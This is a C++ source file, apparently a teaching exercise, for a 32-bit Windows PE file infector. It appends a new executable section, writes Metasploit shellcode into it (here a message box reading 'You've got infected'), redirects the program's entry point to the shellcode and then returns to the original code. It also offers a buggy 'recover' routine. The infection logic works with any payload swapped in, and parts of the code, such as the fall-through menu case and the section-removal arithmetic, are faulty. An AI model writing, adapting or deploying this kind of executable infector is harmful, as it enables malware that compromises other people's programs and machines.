#include <windows.h>
#include <stdio.h>
#include <iostream>     
#include <filesystem>
#include <string>

using namespace std;

// Use visual studio to compile this code (x86) because it will have some problem when compiling with gcc, g++ :<
// This code is for 32-bit PE file only
// Align the size of the section to the required alignment

// How this code work: 
// 1. Open, read and get the PE header of the file
// 2. Check if the file is a PE file, and if it is a 32-bit PE file
// 3. Add a new section, modify the PE header and write it back to the file
// 4. Add shellcode to the new section and write it back to the file
// 5. Change the entry point of the file to the new section, and put the old entry point into end of the new section

DWORD align(DWORD size, DWORD align, DWORD address) {
    if (!(size % align))
        return address + size;
    return address + (size / align + 1) * align;
}

bool AddSection(HANDLE& hFile, PIMAGE_NT_HEADERS& pNtHeader, BYTE* pByte, DWORD& fileSize, DWORD& bytesWritten, DWORD sizeOfSection) {

    //get PE header
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeader);
    WORD sectionCount = pNtHeader->FileHeader.NumberOfSections;

    const char sectionName[] = "hehe123";

    // Check if 'hehe123' section exist
    for (int order = 0; order < sectionCount; order++) {
        PIMAGE_SECTION_HEADER currentSection = pSectionHeader + order;
        if (!strcmp((char*)currentSection->Name, sectionName)) {
            cerr << "Section .hehe123 already exists" << endl;
            CloseHandle(hFile);
            return false;
        }
    }

    //use ZeroMemory() to set all the bytes on header of the last section to 0
    ZeroMemory(&pSectionHeader[sectionCount], sizeof(IMAGE_SECTION_HEADER));
    CopyMemory(&pSectionHeader[sectionCount].Name, sectionName, 8); //add section name to header of the last section
    // Using 8 bytes for section name,cause it is the maximum allowed section name size

    // Fill information of the new section
    pSectionHeader[sectionCount].Misc.VirtualSize = align(sizeOfSection, pNtHeader->OptionalHeader.SectionAlignment, 0);
    pSectionHeader[sectionCount].VirtualAddress = align(pSectionHeader[sectionCount - 1].Misc.VirtualSize, pNtHeader->OptionalHeader.SectionAlignment, pSectionHeader[sectionCount - 1].VirtualAddress);
    pSectionHeader[sectionCount].SizeOfRawData = align(sizeOfSection, pNtHeader->OptionalHeader.FileAlignment, 0);
    pSectionHeader[sectionCount].PointerToRawData = align(pSectionHeader[sectionCount - 1].SizeOfRawData, pNtHeader->OptionalHeader.FileAlignment, pSectionHeader[sectionCount - 1].PointerToRawData);
    pSectionHeader[sectionCount].Characteristics = 0xE00000E0;

    /*
    0xE00000E0 = IMAGE_SCN_MEM_WRITE |
                IMAGE_SCN_CNT_CODE  |
                IMAGE_SCN_CNT_UNINITIALIZED_DATA  |
                IMAGE_SCN_MEM_EXECUTE |
                IMAGE_SCN_CNT_INITIALIZED_DATA |
                IMAGE_SCN_MEM_READ
    */

    // Set the file pointer to the end of the last section 
    SetFilePointer(hFile, pSectionHeader[sectionCount].PointerToRawData + pSectionHeader[sectionCount].SizeOfRawData, NULL, FILE_BEGIN);
    SetEndOfFile(hFile);
    // set new size of image and number of sections
    pNtHeader->OptionalHeader.SizeOfImage = pSectionHeader[sectionCount].VirtualAddress + pSectionHeader[sectionCount].Misc.VirtualSize;
    pNtHeader->FileHeader.NumberOfSections += 1;
    // Adding all the modifications to the file
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    WriteFile(hFile, pByte, fileSize, &bytesWritten, NULL);
    CloseHandle(hFile);
    return true;
}

bool AddCode(HANDLE& hFile, PIMAGE_NT_HEADERS& pNtHeader, BYTE* pByte, DWORD& fileSize, DWORD& byteWritten) {

    pNtHeader->FileHeader.Characteristics = 0x010F;
    /*
    0x010F = IMAGE_FILE_EXECUTABLE_IMAGE |
            IMAGE_FILE_LINE_NUMS_STRIPPED |
            IMAGE_FILE_LOCAL_SYMS_STRIPPED |
            IMAGE_FILE_32BIT_MACHINE |
            IMAGE_FILE_DEBUG_STRIPPED |
            IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP |
            IMAGE_FILE_NET_RUN_FROM_SWAP |
            IMAGE_FILE_SYSTEM |
            IMAGE_FILE_DLL
    */
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeader);
    WORD sectionCount = pNtHeader->FileHeader.NumberOfSections;
    const char sectionName[] = "hehe123";
    //check if section don't be add
    PIMAGE_SECTION_HEADER currentSection = pSectionHeader + sectionCount - 1;
    if (strcmp((char*)currentSection->Name, sectionName)) {
        cerr << "Section .hehe123 not found" << endl;
        CloseHandle(hFile);
        return false;
    }
    // Insert code into last section
    PIMAGE_SECTION_HEADER firstSection = IMAGE_FIRST_SECTION(pNtHeader);
    PIMAGE_SECTION_HEADER lastSection = firstSection + (pNtHeader->FileHeader.NumberOfSections - 1);

    DWORD lastEntryPoint = pNtHeader->OptionalHeader.AddressOfEntryPoint + pNtHeader->OptionalHeader.ImageBase;
    pNtHeader->OptionalHeader.AddressOfEntryPoint = lastSection->VirtualAddress;

    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    WriteFile(hFile, pByte, fileSize, &byteWritten, NULL);
    SetFilePointer(hFile, lastSection->PointerToRawData, NULL, FILE_BEGIN);

    // Shellcode from metasploit
    const char* shellcode1 = "\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9\x64"
        "\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08\x8b\x7e"
        "\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1\xff\xe1\x60"
        "\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28\x78\x01\xea\x8b"
        "\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34\x49\x8b\x34\x8b\x01"
        "\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d"
        "\x01\xc7\xeb\xf4\x3b\x7c\x24\x28\x75\xe1\x8b\x5a\x24\x01"
        "\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04\x8b\x01"
        "\xe8\x89\x44\x24\x1c\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89"
        "\xc2\x68\x8e\x4e\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45"
        "\x04\xbb\x7e\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff"
        "\xff\x89\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64"
        "\x68\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
        "\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c\x24"
        "\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67"
        "\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89"
        "\xe3\x68\x74\x65\x64\x58\x68\x6e\x66\x65\x63\x68\x6f\x74"
        "\x20\x69\x68\x76\x65\x20\x67\x68\x59\x6f\x75\x27\x31\xc9"
        "\x88\x4c\x24\x13\x89\xe1\x31\xd2\x52\x53\x51\x52\xff\xd0"
        "\x31\xc0\x50\x68";

    DWORD shellcodeSize = strlen(shellcode1);
    WriteFile(hFile, shellcode1, shellcodeSize, &byteWritten, NULL);
    if (byteWritten != shellcodeSize) {
        cout << "Error: Fail to write file" << endl;
        return false;
    }
    // Get entry point and use little endian and change to hex
    for (int i = 0; i < 4; i++) {
        BYTE carrier = (BYTE)(lastEntryPoint >> (i * 8));
        WriteFile(hFile, &carrier, 1, &byteWritten, NULL);
    }
    // Add \xc3 to the end of shellcode
    // \xc3 is ret instruction 
    const char* shellcode2 = "\xc3";
    WriteFile(hFile, shellcode2, 1, &byteWritten, NULL);
    if (byteWritten != 1) {
        cout << " Error: Fail to write file " << endl;
        return false;
    }
    CloseHandle(hFile);
    return true;
}

//get entry point before infected
uint32_t getOEP(PIMAGE_NT_HEADERS& pNtHeader, BYTE* pByte) {
    PIMAGE_SECTION_HEADER first = IMAGE_FIRST_SECTION(pNtHeader);
    PIMAGE_SECTION_HEADER last = first + pNtHeader->FileHeader.NumberOfSections - 1;
    // Point pByte to address offset 0x100 of last section
    pByte += last->PointerToRawData + 0x100;
    uint32_t originEntryPoint = *(uint32_t*)(pByte + 14);
    return originEntryPoint;
}
//restore the file
bool removeVR(HANDLE& hFile, PIMAGE_NT_HEADERS& pNtHeader, BYTE* pByte, DWORD& fileSize, DWORD& byteWritten) {

    uint32_t OEP = getOEP(pNtHeader, pByte); //get entry point before infected
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(pNtHeader);
    PIMAGE_SECTION_HEADER lastSection = section + pNtHeader->FileHeader.NumberOfSections - 1;
    pNtHeader->OptionalHeader.AddressOfEntryPoint = OEP - pNtHeader->OptionalHeader.ImageBase;

    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    WriteFile(hFile, pByte, fileSize, &byteWritten, NULL);

    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    for (int i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)section[i].Name, ".hehe123") == 0) {
            // delete the shellcode section
            memmove(&section[i], &section[i + 1], (pNtHeader->FileHeader.NumberOfSections - i - 1) * sizeof(IMAGE_SECTION_HEADER));
            pNtHeader->FileHeader.NumberOfSections -= 1;
            pNtHeader->OptionalHeader.SizeOfImage -= sizeof(IMAGE_SECTION_HEADER);
            pNtHeader->OptionalHeader.SizeOfHeaders -= sizeof(IMAGE_SECTION_HEADER);
            break;
        }
    }

    SetEndOfFile(hFile);
    WriteFile(hFile, pByte, fileSize, &byteWritten, NULL);
    return true;

}


int main(int argc, char* argv[]) {

    if (argc < 2) {
        cout << "Usage: " << argv[0] << " <path\\of\\directory\\>" << endl;
        return 1;
    }
    //READ file
    const char* fileName = argv[1];
    HANDLE hFile = CreateFileA(fileName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        cerr << "Error: Invalid file, try another one" << endl;
        return false;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (!fileSize) {
        CloseHandle(hFile);
        cerr << "Error: File " << fileName << " empty, try another one" << endl;
        return false;
    }
    // allocate the buffer for size of file
    BYTE* pByte = new BYTE[fileSize];
    DWORD byteWritten;

    // Reading the entire file to use the PE information
    if (!ReadFile(hFile, pByte, fileSize, &byteWritten, NULL)) {
        cerr << "Error: Fail to read file " << fileName << endl;
    }

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pByte;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        CloseHandle(hFile);
        cerr << "Error: Invalid path or PE format" << endl;
        return false;
    }

    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)(pByte + pDosHeader->e_lfanew);
    if (pNtHeader->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
        CloseHandle(hFile);
        cerr << "Please input path to file PE32" << endl;
        return false;
    }

    int choose;
    cout << "1. Add section" << endl;
    cout << "2. Inject code to one file" << endl;
    cout << "3. Recover the file" << endl;
    cin >> choose;
    switch (choose)
    {
    case 1:
        //add section 
        if (!AddSection(hFile, pNtHeader, pByte, fileSize, byteWritten, 400)) {
            cerr << "Error: Fail to create new section" << endl;
            return false;
        }
    case 2:
        //add code
        if (!AddCode(hFile, pNtHeader, pByte, fileSize, byteWritten)) {
            cerr << "Fail to infect code" << endl;
            return false;
        }
        break;
    case 3:
        //remove code
        if (!removeVR(hFile, pNtHeader, pByte, fileSize, byteWritten)) {
            cerr << "Fail to remove code" << endl;
            return false;
        }
        break;
    }
    CloseHandle(hFile);

    return 0;
}